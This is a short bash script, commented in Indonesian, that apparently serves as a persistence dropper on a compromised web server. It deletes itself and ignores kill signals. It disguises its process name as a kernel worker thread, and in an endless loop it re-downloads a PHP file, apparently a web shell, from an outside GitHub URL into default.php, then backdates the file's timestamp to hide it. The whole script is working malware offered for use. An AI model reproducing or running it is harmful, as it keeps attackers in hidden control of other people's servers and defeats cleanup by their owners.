#!/bin/bash

# 1. Definisikan Environment dan Path
# Penting agar user web server bisa menemukan perintah curl/chmod
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DIR="$(cd "$(dirname "$0")" && pwd)"
file_name="$DIR/default.php"
url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpha-wp.php"
timestamp="201201081531.12"

# 2. Fungsi Perlindungan Sinyal
trap '' SIGTERM SIGINT SIGHUP

# 3. Fungsi Penghapusan Jejak Fisik
# Menghapus file x.sh segera setelah dieksekusi agar tidak terlihat di folder
self_delete() {
    rm -f "$0" 2>/dev/null
}

# 4. Mekanisme Daemon (Berjalan di latar belakang)
# Memutuskan hubungan dengan proses PHP/Browser agar tidak timeout
daemonize() {
    (
        # Mengubah nama proses di memori agar menyamar sebagai sistem
        echo -ne "[kworker/u16:2]\x00" > /proc/self/comm 2>/dev/null
        
        # Loop utama: Mengunduh dan mengunci file
        while true; do
            if [ ! -f "$file_name" ]; then
                curl -sL "$url" -o "$file_name"
            fi
            chmod 0644 "$file_name"
            touch -t "$timestamp" "$file_name"
            
            # Loop internal untuk menjaga file setiap detik
            for ((i=0; i<30; i++)); do
                [ ! -f "$file_name" ] && curl -sL "$url" -o "$file_name"
                chmod 0644 "$file_name"
                touch -t "$timestamp" "$file_name"
                sleep 1
            done
        done
    ) & disown
}

# Eksekusi urutan fungsi
self_delete
daemonize
exit 0
